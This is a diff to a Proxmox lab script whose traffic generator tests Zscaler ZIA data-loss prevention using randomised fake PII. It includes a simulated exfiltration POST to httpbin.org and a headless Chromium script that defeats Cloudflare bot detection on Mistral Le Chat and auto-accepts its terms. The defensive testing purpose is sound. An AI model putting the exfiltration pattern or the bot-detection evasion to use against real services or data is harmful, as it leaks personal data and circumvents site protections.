@@ -13,7 +13,7 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 NC='\033[0m'
-VERSION="3.6.0"
+VERSION="3.6.1"
 
 CONFIG_FILE="${HOME}/.proxmox-lab.conf"
 if [ -f "$CONFIG_FILE" ]; then
@@ -1101,7 +1101,7 @@ _build_deploy_entries() {
     esac
 
     case "$profile" in
-      office-worker|monitoring|devops|developer|sales|executive) mem=512 ;;
+      office-worker|monitoring|devops|developer|sales|executive) mem=768 ;;
       *) mem="${MEMORY:-256}" ;;
     esac
 
@@ -2651,12 +2651,16 @@ EOF
     dlp-network)
       run_on_node "$CT_NODE" pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-network.sh' <<'EOF'
 #!/bin/bash
+FIRST_NAMES=("James" "Michael" "Robert" "David" "Jennifer" "Sarah" "Emily" "Laura")
+LAST_NAMES=("Anderson" "Martinez" "Thompson" "Williams" "Chen" "Patel" "Johnson" "Davis")
+FAKE_NAME="${FIRST_NAMES[$((RANDOM % ${#FIRST_NAMES[@]}))]} ${LAST_NAMES[$((RANDOM % ${#LAST_NAMES[@]}))]}"
 FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
 FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+FAKE_NAME_URL=$(printf '%s' "$FAKE_NAME" | sed 's/ /+/g')
 echo "[$(date)] DLP test: Network data exfiltration attempt (SSN/CCN)"
 curl -s -m 15 -X POST \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "ssn=${FAKE_SSN}&card=${FAKE_CCN}&name=John+Smith" \
+  -d "ssn=${FAKE_SSN}&card=${FAKE_CCN}&name=${FAKE_NAME_URL}" \
   https://httpbin.org/post > /dev/null 2>&1 || true
 EOF
       ;;
@@ -2667,17 +2671,26 @@ EOF
 # DLP test: Submit a prompt containing fake PII to GenAI web app endpoints.
 # Uses the same endpoints as genai_web_prompt() so ZIA recognises them as
 # GenAI web app traffic and fires BOTH a DLP event and a prompt capture event.
+FIRST_NAMES=("James" "Michael" "Robert" "David" "Jennifer" "Sarah" "Emily" "Laura" "Daniel" "Megan")
+LAST_NAMES=("Anderson" "Martinez" "Thompson" "Williams" "Chen" "Patel" "Johnson" "Davis" "Rodriguez" "Wilson")
+FAKE_NAME="${FIRST_NAMES[$((RANDOM % ${#FIRST_NAMES[@]}))]} ${LAST_NAMES[$((RANDOM % ${#LAST_NAMES[@]}))]}"
 FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
 FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+FAKE_DOB="$((RANDOM % 28 + 1970))-$(printf '%02d' $((RANDOM % 12 + 1)))-$(printf '%02d' $((RANDOM % 28 + 1)))"
 
 PROMPTS=(
-  "I need help drafting a customer verification email. The customer's SSN is ${FAKE_SSN} and their Visa card on file is ${FAKE_CCN}. Can you write a professional confirmation message?"
-  "Can you help me fill out this insurance claim form? Claimant SSN: ${FAKE_SSN}. Payment card for reimbursement: ${FAKE_CCN}. What fields should I complete first?"
-  "I'm onboarding a new employee. Their SSN for payroll is ${FAKE_SSN} and the corporate card we're issuing is ${FAKE_CCN}. What HR paperwork should I start with?"
+  "I need help drafting a customer verification email. The customer's name is ${FAKE_NAME}, SSN ${FAKE_SSN}, DOB ${FAKE_DOB}, and Visa card on file is ${FAKE_CCN}. Can you write a professional confirmation message?"
+  "Can you help me fill out this insurance claim form? Claimant: ${FAKE_NAME}, DOB ${FAKE_DOB}, SSN ${FAKE_SSN}. Payment card for reimbursement: ${FAKE_CCN}. What fields should I complete first?"
+  "I'm onboarding a new employee. Their name is ${FAKE_NAME}, DOB ${FAKE_DOB}, SSN for payroll is ${FAKE_SSN} and the corporate card we're issuing is ${FAKE_CCN}. What HR paperwork should I start with?"
+  "Help me draft a collections notice for ${FAKE_NAME}, DOB ${FAKE_DOB}, SSN ${FAKE_SSN}. Their account balance is \$4,872 past due. What tone should I use for a first-contact letter?"
+  "I'm preparing a background check summary for a new hire. Full name: ${FAKE_NAME}, date of birth: ${FAKE_DOB}, SSN: ${FAKE_SSN}. Can you suggest a template for the HR file?"
+  "Our compliance team needs to document this customer: ${FAKE_NAME}, SSN ${FAKE_SSN}, DOB ${FAKE_DOB}, credit card ${FAKE_CCN}. What fields are required for KYC documentation?"
+  "Summarize this employee record for the quarterly audit: ${FAKE_NAME}, DOB ${FAKE_DOB}, SSN ${FAKE_SSN}, card on file ${FAKE_CCN}, department: Finance."
+  "Write a benefits enrollment confirmation for ${FAKE_NAME}, SSN ${FAKE_SSN}, DOB ${FAKE_DOB}. They selected the PPO plan with HSA contribution of \$200/month."
 )
 PROMPT="${PROMPTS[$((RANDOM % ${#PROMPTS[@]}))]}"
 
-PLATFORMS=("chatgpt" "gemini")
+PLATFORMS=("chatgpt" "gemini" "mistral")
 PLATFORM="${PLATFORMS[$((RANDOM % ${#PLATFORMS[@]}))]}"
 
 u1=$(cat /proc/sys/kernel/random/uuid)
@@ -2708,8 +2721,7 @@ case "$PLATFORM" in
     echo "[$(date)] DLP/genai: perplexity skipped"
     ;;
   mistral)
-    # Disabled — prompt submission not generating expected ZIA events.
-    echo "[$(date)] DLP/genai: mistral skipped"
+    python3 /opt/traffic-gen/utils/mistral-prompt.py "$PROMPT" > /dev/null 2>&1 || true
     ;;
 esac
 EOF
@@ -2718,14 +2730,23 @@ EOF
     dlp-genai-file)
       run_on_node "$CT_NODE" pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-genai-file.sh' <<'EOF'
 #!/bin/bash
+FIRST_NAMES=("James" "Michael" "Robert" "David" "Jennifer" "Sarah" "Emily" "Laura" "Daniel" "Megan")
+LAST_NAMES=("Anderson" "Martinez" "Thompson" "Williams" "Chen" "Patel" "Johnson" "Davis" "Rodriguez" "Wilson")
+FAKE_NAME="${FIRST_NAMES[$((RANDOM % ${#FIRST_NAMES[@]}))]} ${LAST_NAMES[$((RANDOM % ${#LAST_NAMES[@]}))]}"
 FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
 FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
 FAKE_ACCT="$((RANDOM % 900000000 + 100000000))"
+FAKE_DOB="$((RANDOM % 28 + 1970))-$(printf '%02d' $((RANDOM % 12 + 1)))-$(printf '%02d' $((RANDOM % 28 + 1)))"
+STREETS=("Oak Street" "Maple Avenue" "Cedar Lane" "Elm Drive" "Pine Road" "Birch Court")
+CITIES=("Springfield IL 62701" "Columbus OH 43215" "Madison WI 53703" "Raleigh NC 27601" "Richmond VA 23219")
+FAKE_ADDR="$((RANDOM % 9000 + 1000)) ${STREETS[$((RANDOM % ${#STREETS[@]}))]} — ${CITIES[$((RANDOM % ${#CITIES[@]}))]}"
 TMPFILE=$(mktemp /tmp/dlp-doc.XXXXXX)
 cat > "$TMPFILE" <<PIIEOF
 CONFIDENTIAL - Employee Financial Record
 ========================================
-Name: John Smith
+Name: ${FAKE_NAME}
+Date of Birth: ${FAKE_DOB}
+Home Address: ${FAKE_ADDR}
 Employee ID: EMP-$((RANDOM % 9000 + 1000))
 Department: Finance
 Social Security Number: ${FAKE_SSN}
@@ -2749,17 +2770,23 @@ EOF
       run_on_node "$CT_NODE" pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-genai-image.sh' <<'EOF'
 #!/bin/bash
 # Requires imagemagick (installed by proxmox-lab.sh)
+FIRST_NAMES=("James" "Michael" "Robert" "David" "Jennifer" "Sarah" "Emily" "Laura" "Daniel" "Megan")
+LAST_NAMES=("Anderson" "Martinez" "Thompson" "Williams" "Chen" "Patel" "Johnson" "Davis" "Rodriguez" "Wilson")
+FAKE_NAME="${FIRST_NAMES[$((RANDOM % ${#FIRST_NAMES[@]}))]} ${LAST_NAMES[$((RANDOM % ${#LAST_NAMES[@]}))]}"
 FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
 FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+FAKE_DOB="$((RANDOM % 28 + 1970))-$(printf '%02d' $((RANDOM % 12 + 1)))-$(printf '%02d' $((RANDOM % 28 + 1)))"
 TMPIMG="/tmp/dlp-img.$$.png"
 TMPJSON="/tmp/dlp-req.$$.json"
-convert -size 500x180 xc:white \
+convert -size 560x210 xc:white \
   -font DejaVu-Sans -pointsize 14 -fill black \
   -draw "text 20,30 'CONFIDENTIAL - Employee Record'" \
-  -draw "text 20,60 'Name: John Smith'" \
-  -draw "text 20,85 'SSN: ${FAKE_SSN}'" \
-  -draw "text 20,110 'Credit Card: ${FAKE_CCN}'" \
-  -draw "text 20,135 'Classification: RESTRICTED'" \
+  -draw "text 20,58 'Name: ${FAKE_NAME}'" \
+  -draw "text 20,83 'Date of Birth: ${FAKE_DOB}'" \
+  -draw "text 20,108 'SSN: ${FAKE_SSN}'" \
+  -draw "text 20,133 'Credit Card: ${FAKE_CCN}'" \
+  -draw "text 20,158 'Classification: RESTRICTED'" \
+  -draw "text 20,183 'Department: Finance'" \
   "$TMPIMG" 2>/dev/null
 if [ ! -s "$TMPIMG" ]; then
   echo "[$(date)] GenAI OCR DLP: imagemagick unavailable, skipping"
@@ -2891,6 +2918,8 @@ async def run(prompt):
             # so it won't trust the ZIA TLS inspection CA by default.
             # ZIA inspects at the proxy layer regardless of client cert validation.
             '--ignore-certificate-errors',
+            # Force TCP so ZIA can inspect; QUIC (HTTP/3 over UDP) bypasses TLS inspection.
+            '--disable-quic',
         ],
         handleSIGINT=False,
         handleSIGTERM=False,
@@ -2949,6 +2978,146 @@ if __name__ == '__main__':
         asyncio.run(run(sys.argv[1]))
     except Exception as e:
         print(f'[gemini-prompt] {e}', file=sys.stderr)
+        sys.exit(1)
+EOF
+
+  run_on_node "$CT_NODE" pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/utils/mistral-prompt.py' <<'EOF'
+#!/usr/bin/env python3
+"""
+Headless Chromium script to submit a prompt to Mistral Le Chat.
+Navigates to chat.mistral.ai/chat, types the prompt, and submits it.
+ZIA inspects the outbound browser session and fires a prompt capture event.
+
+Uses --disable-blink-features=AutomationControlled and overrides
+navigator.webdriver to pass Cloudflare bot detection.
+
+Requires: chromium (apk), pyppeteer (pip)
+Usage: python3 mistral-prompt.py "your prompt text"
+"""
+import asyncio
+import sys
+
+
+async def run(prompt):
+    import pyppeteer
+    browser = await pyppeteer.launch(
+        executablePath='/usr/bin/chromium-browser',
+        headless=True,
+        args=[
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-gpu',
+            '--no-zygote',
+            '--disable-extensions',
+            '--disable-background-networking',
+            '--ignore-certificate-errors',
+            # Force TCP so ZIA can inspect; QUIC (HTTP/3 over UDP) bypasses TLS inspection.
+            '--disable-quic',
+            '--disable-blink-features=AutomationControlled',
+        ],
+        handleSIGINT=False,
+        handleSIGTERM=False,
+    )
+    try:
+        page = await browser.newPage()
+        await page.evaluateOnNewDocument(
+            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
+        )
+        await page.setUserAgent(
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
+            'AppleWebKit/537.36 (KHTML, like Gecko) '
+            'Chrome/145.0.0.0 Safari/537.36'
+        )
+        await page.setViewport({'width': 1280, 'height': 800})
+
+        await page.goto('https://chat.mistral.ai/chat', {
+            'waitUntil': 'networkidle2',
+            'timeout': 45000,
+        })
+
+        # Dismiss terms/usage agreement modal if present (shown on first visit
+        # with a fresh browser profile — every headless run qualifies).
+        await asyncio.sleep(1)
+        accepted = await page.evaluate('''() => {
+            const btns = Array.from(document.querySelectorAll('button'));
+            const terms = btns.find(b => {
+                const t = b.textContent.trim().toLowerCase();
+                return t.includes('accept') || t.includes('agree') ||
+                       t === 'continue' || t === 'get started' || t === 'ok';
+            });
+            if (terms) { terms.click(); return true; }
+            return false;
+        }''')
+        if accepted:
+            # Accepting terms may trigger a page navigation — wait for it to settle.
+            try:
+                await page.waitForNavigation({
+                    'waitUntil': 'networkidle2',
+                    'timeout': 15000,
+                })
+            except Exception:
+                # No navigation occurred (just a modal dismissal), give it a moment.
+                await asyncio.sleep(2)
+
+        selectors = [
+            'textarea',
+            'div[contenteditable="true"]',
+            'div[role="textbox"]',
+        ]
+        input_el = None
+        for sel in selectors:
+            try:
+                input_el = await page.waitForSelector(
+                    sel, {'timeout': 10000, 'visible': True}
+                )
+                if input_el:
+                    break
+            except Exception:
+                continue
+
+        if not input_el:
+            raise RuntimeError('Could not find Mistral input element')
+
+        await input_el.click()
+        await asyncio.sleep(0.5)
+        await page.keyboard.type(prompt, {'delay': 30})
+        await asyncio.sleep(0.8)
+
+        # Click the send button
+        send_selectors = [
+            'button[aria-label="Send question"]',
+            'button[aria-label="Send"]',
+            'button[aria-label="Send message"]',
+            'button[type="submit"]',
+        ]
+        sent = False
+        for sel in send_selectors:
+            try:
+                btn = await page.querySelector(sel)
+                if btn:
+                    await btn.click()
+                    sent = True
+                    break
+            except Exception:
+                continue
+        if not sent:
+            await page.keyboard.press('Enter')
+
+        # Wait for the request to be sent before closing
+        await asyncio.sleep(6)
+    finally:
+        await browser.close()
+
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        print('Usage: mistral-prompt.py <prompt>', file=sys.stderr)
+        sys.exit(1)
+    try:
+        asyncio.run(run(sys.argv[1]))
+    except Exception as e:
+        print(f'[mistral-prompt] {e}', file=sys.stderr)
         sys.exit(1)
 EOF
 
@@ -3015,8 +3184,10 @@ genai_web_prompt() {
       echo "[$(date)] GenAI: perplexity skipped"
       ;;
     mistral)
-      # Disabled — prompt submission not generating expected ZIA events.
-      echo "[$(date)] GenAI: mistral skipped"
+      # Use headless Chromium with AutomationControlled disabled to pass Cloudflare
+      # bot detection and submit via a real browser session ZIA can inspect.
+      python3 /opt/traffic-gen/utils/mistral-prompt.py "$prompt" \
+        > /dev/null 2>&1 || true
       ;;
   esac
 }
@@ -5102,52 +5273,6 @@ function Invoke-PerplexityPrompt {
         }
 }
 
-function Invoke-MistralPrompt {
-    param([string]$Prompt, [string]$UserAgent)
-    $anonId  = [System.Guid]::NewGuid().ToString()
-    $bodyObj = @{
-        '0' = @{
-            json = @{
-                content                = @(@{ type = 'text'; text = $Prompt })
-                agentId                = $null
-                agentsApiAgentId       = $null
-                files                  = @()
-                isSampleChatForAgentId = $null
-                model                  = $null
-                features               = @('beta-websearch')
-                integrations           = @()
-                canva                  = $null
-                action                 = $null
-                libraries              = @()
-                projectId              = $null
-                transcriptionsMetadata = $null
-                incognito              = $false
-            }
-            meta = @{
-                values = @{
-                    agentId                = @('undefined')
-                    agentsApiAgentId       = @('undefined')
-                    isSampleChatForAgentId = @('undefined')
-                    model                  = @('undefined')
-                    canva                  = @('undefined')
-                    action                 = @('undefined')
-                    projectId              = @('undefined')
-                    transcriptionsMetadata = @('undefined')
-                }
-            }
-        }
-    }
-    $body = $bodyObj | ConvertTo-Json -Depth 8 -Compress
-    Invoke-Traffic -Uri 'https://chat.mistral.ai/api/trpc/message.newChat?batch=1' `
-        -Method 'POST' -Body $body -ContentType 'application/json' -UserAgent $UserAgent `
-        -Headers @{
-            'Trpc-Accept'   = 'application/jsonl'
-            'X-Trpc-Source' = 'nextjs-react'
-            'Origin'        = 'https://chat.mistral.ai'
-            'Referer'       = 'https://chat.mistral.ai/chat'
-            'Cookie'        = "anonymousUser=$anonId"
-        }
-}
 
 function Invoke-GeminiPrompt {
     param([string]$Prompt, [string]$UserAgent)
@@ -5187,7 +5312,6 @@ function Invoke-GenAIWebPrompt {
         chatgpt    = 'https://chatgpt.com'
         gemini     = 'https://gemini.google.com'
         perplexity = 'https://www.perplexity.ai'
-        mistral    = 'https://chat.mistral.ai'
     }
     if ($homepages.ContainsKey($Provider)) {
         Invoke-Traffic -Uri $homepages[$Provider] -UserAgent $UserAgent
@@ -5197,7 +5321,7 @@ function Invoke-GenAIWebPrompt {
         'chatgpt'    { Invoke-ChatGPTPrompt    -Prompt $Prompt -UserAgent $UserAgent }
         'gemini'     { Invoke-GeminiPrompt     -Prompt $Prompt -UserAgent $UserAgent }
         'perplexity' { Invoke-PerplexityPrompt -Prompt $Prompt -UserAgent $UserAgent }
-        'mistral'    { Invoke-MistralPrompt    -Prompt $Prompt -UserAgent $UserAgent }
+        # mistral: blocked by Cloudflare bot protection on web UI; API does not generate prompt captures
     }
 }
 
@@ -5244,16 +5368,32 @@ function Invoke-ThreatSession {
 
     # --- DLP: POST fake PII to public endpoint ---
     Write-TrafficLog "dlp-network: POST fake SSN/CCN to HTTPS endpoint"
-    $body = "firstname=John&lastname=Smith&ssn=123-45-6789&ccn=4111111111111111&amount=9500&account=87654321"
+    $firstNames = @("James","Michael","Robert","David","Jennifer","Sarah","Emily","Laura","Daniel","Megan")
+    $lastNames  = @("Anderson","Martinez","Thompson","Williams","Chen","Patel","Johnson","Davis","Rodriguez","Wilson")
+    $fakeFN  = $firstNames | Get-Random
+    $fakeLN  = $lastNames  | Get-Random
+    $fakeSSN = "{0:D3}-{1:D2}-{2:D4}" -f (Get-Random -Min 200 -Max 899), (Get-Random -Min 10 -Max 99), (Get-Random -Min 1000 -Max 9999)
+    $fakeCCN = "4111{0:D4}{1:D4}{2:D4}" -f (Get-Random -Min 1000 -Max 9999), (Get-Random -Min 1000 -Max 9999), (Get-Random -Min 1000 -Max 9999)
+    $fakeDOB = "{0:D4}/{1:D2}/{2:D2}" -f (Get-Random -Min 1960 -Max 1999), (Get-Random -Min 1 -Max 12), (Get-Random -Min 1 -Max 28)
+    $fakeAcct = Get-Random -Min 10000000 -Max 99999999
+    $streets = @("Oak Street","Maple Avenue","Cedar Lane","Elm Drive","Pine Road","Birch Court")
+    $cities  = @("Springfield IL 62701","Columbus OH 43215","Madison WI 53703","Raleigh NC 27601","Richmond VA 23219")
+    $fakeAddr = "{0} {1}, {2}" -f (Get-Random -Min 100 -Max 9999), ($streets | Get-Random), ($cities | Get-Random)
+    $body = "firstname=${fakeFN}&lastname=${fakeLN}&ssn=${fakeSSN}&ccn=${fakeCCN}&amount=9500&account=${fakeAcct}"
     Invoke-Traffic -Uri "https://httpbin.org/post" `
         -Method "POST" -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $ua
     Start-RandomDelay -Min 3 -Max 8
 
     # Shared PII payload for GenAI DLP tests
     $piiPrompt = @(
-        "Summarize this employee record: John Smith, DOB 03/15/1985, SSN 123-45-6789, salary $92000, perf rating 4.2.",
-        "Draft a collections letter to John Smith at 123 Main St Springfield IL 62701, account 87654321, balance $5,240.",
-        "Analyze this patient: Jane Doe, DOB 07/22/1978, MRN 456789, diagnosis hypertension, insurance ID HMO-987654."
+        "Summarize this employee record: ${fakeFN} ${fakeLN}, DOB ${fakeDOB}, SSN ${fakeSSN}, salary `$92000, perf rating 4.2.",
+        "Draft a collections letter to ${fakeFN} ${fakeLN} at ${fakeAddr}, account ${fakeAcct}, balance `$5,240.",
+        "Analyze this patient: ${fakeFN} ${fakeLN}, DOB ${fakeDOB}, SSN ${fakeSSN}, diagnosis hypertension, insurance ID HMO-${fakeAcct}.",
+        "I need help with a customer verification email. Name: ${fakeFN} ${fakeLN}, DOB: ${fakeDOB}, SSN: ${fakeSSN}, card on file: ${fakeCCN}.",
+        "Prepare a KYC summary for ${fakeFN} ${fakeLN}, address ${fakeAddr}, DOB ${fakeDOB}, SSN ${fakeSSN}, credit card ${fakeCCN}.",
+        "Draft HR onboarding paperwork for ${fakeFN} ${fakeLN}, SSN ${fakeSSN}, DOB ${fakeDOB}. Issuing corporate card ${fakeCCN}.",
+        "Write a benefits confirmation for ${fakeFN} ${fakeLN}, SSN ${fakeSSN}, DOB ${fakeDOB}. PPO plan selected, HSA `$200/month.",
+        "Prepare an audit note for employee ${fakeFN} ${fakeLN}: DOB ${fakeDOB}, SSN ${fakeSSN}, bank account ${fakeAcct}, routing 021000021."
     ) | Get-Random
 
     # --- DLP: GenAI prompt with PII - OpenAI ---
@@ -5282,15 +5422,13 @@ function Invoke-ThreatSession {
         }
     Start-RandomDelay -Min 3 -Max 8
 
-    # --- DLP: GenAI prompt with PII - Google Gemini ---
-    Write-TrafficLog "dlp-genai-prompt: POST PII to Google Gemini API"
-    $geminiPayload = @{
-        contents = @(@{
-            parts = @(@{ text = $piiPrompt })
-        })
-    } | ConvertTo-Json -Depth 4
-    Invoke-Traffic -Uri "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=dlp-test-no-valid-key" `
-        -Method "POST" -Body $geminiPayload -ContentType "application/json" -UserAgent $ua
+    # --- DLP: GenAI prompt with PII - Google Gemini (web app endpoint) ---
+    # Uses Invoke-GeminiPrompt so ZIA sees this as GenAI web app traffic and
+    # fires both a DLP event and a prompt capture event, matching genai_web_prompt().
+    Write-TrafficLog "dlp-genai-prompt: POST PII to Gemini web app endpoint"
+    Invoke-Traffic -Uri "https://gemini.google.com" -UserAgent $ua
+    Start-RandomDelay -Min 2 -Max 5
+    Invoke-GeminiPrompt -Prompt $piiPrompt -UserAgent $ua
 }
 
 # ---------------------------------------------------------------------------
